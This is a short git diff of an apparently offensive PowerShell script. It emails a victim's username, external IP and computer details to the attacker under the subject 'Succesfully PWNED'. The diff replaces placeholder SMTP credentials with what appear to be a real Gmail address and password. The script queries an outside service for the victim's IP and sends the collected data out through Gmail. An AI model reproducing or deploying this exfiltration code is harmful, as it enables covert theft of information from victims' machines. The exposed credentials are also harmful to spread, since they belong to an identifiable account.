@@ -13,10 +13,10 @@ $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
 $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("your email address", "your email password");
+$smtp.Credentials = New-Object System.Net.NetworkCredential("devin0812@gmail.com", "Osta-b60");
 $smtp.EnableSsl = $true
-$Message.From = "your email address"
-$Message.To.Add("your email address")
+$Message.From = "devin0812@gmail.com "
+$Message.To.Add("devin0812@gmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
